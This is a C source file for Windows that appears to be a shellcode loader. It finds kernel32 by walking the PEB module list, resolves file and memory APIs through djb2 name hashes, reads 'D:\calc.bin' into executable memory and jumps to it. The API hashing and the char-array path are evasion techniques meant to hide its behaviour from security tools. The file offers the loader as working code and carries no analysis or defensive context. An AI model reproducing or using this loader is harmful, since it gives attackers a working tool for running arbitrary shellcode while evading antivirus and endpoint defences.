#include "common.h"

void myMain()
{

    

#ifdef _WIN64 
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32 
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLIST_ENTRY pListEntry = (PLIST_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);

    pListEntry = pListEntry->Flink;
    pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);
    pListEntry = pListEntry->Flink;
    pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);

    HMODULE kHandle = (HMODULE)(pDte->DllBase);

    API_TABLE Api;

    Api.fnCreateFileA= (myCreateFileA)myGetProcAddress(kHandle, Hash::CreateFileAHash);
    Api.fnGetFileSize= (myGetFileSize)myGetProcAddress(kHandle, Hash::GetFileSizeHash);
    Api.fnReadFile= (myReadFile)myGetProcAddress(kHandle, Hash::ReadFileHash);
    Api.fnCloseHandle= (myCloseHandle)myGetProcAddress(kHandle, Hash::CloseHandleHash);
    Api.fnVirtualAlloc= (myVirtualAlloc)myGetProcAddress(kHandle, Hash::VirtualAllocHash);
    Api.fnVirtualFree= (myVirtualFree)myGetProcAddress(kHandle, Hash::VirtualFreeHash);

    char filePath[] = { 'D', ':', '\\', 'c', 'a', 'l', 'c', '.', 'b', 'i', 'n', 0 };

    HANDLE hFile = Api.fnCreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = Api.fnGetFileSize(hFile, NULL);
    void* execMem = Api.fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        Api.fnCloseHandle(hFile);
    }
    DWORD bytesRead;
    if (!Api.fnReadFile(hFile, execMem, fileSize, &bytesRead, NULL)) {
        Api.fnCloseHandle(hFile);
        Api.fnVirtualFree(execMem, 0, MEM_RELEASE);
    }
    Api.fnCloseHandle(hFile);

    ((void(*)())execMem)();

    Api.fnVirtualFree(execMem, 0, MEM_RELEASE);

}


PVOID myGetProcAddress(IN HMODULE hModule, DWORD64 dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == djb2(pFunctionName)) {
            return pFunctionAddress;
        }
    }

    return NULL;
}

